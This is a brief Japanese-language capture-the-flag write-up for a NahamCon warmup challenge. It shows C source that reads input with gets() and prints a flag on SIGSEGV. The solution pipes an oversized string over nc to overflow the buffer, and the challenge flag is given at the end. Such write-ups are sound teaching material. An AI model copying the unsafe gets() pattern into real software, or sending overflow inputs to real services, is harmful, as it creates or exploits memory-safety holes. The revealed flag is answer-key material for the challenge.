# Crash Override:Warmups:50pts
Remember, hacking is more than just a crime. It's a survival trait.  

**Connect with:**  
```
nc challenge.nahamcon.com 30864
```

**Attachments:** [crash_override.c](crash_override.c)　[Makefile](Makefile)　[crash_override](crash_override)  

# Solution
ソースやバイナリや接続先などが渡される。  
ソースを見るとmainは以下のようであった。  
```C
~~~
int main(void) {
    char buffer[2048];

    setbuf(stdin, NULL);
    setbuf(stdout, NULL);

    signal(SIGSEGV, win);

    puts("HACK THE PLANET!!!!!!");
    gets(buffer);

    return 0;
}
~~~
```
win関数ではflagが表示されるため、BOFを引き起こせばよいようだ。  
以下のように行う。  
```bash
$ python -c 'print("A"*3000)' | nc challenge.nahamcon.com 30864
HACK THE PLANET!!!!!!
flag{de8b6655b538a0bf567b79a14f2669f6}
```
flagが得られた。  

## flag{de8b6655b538a0bf567b79a14f2669f6}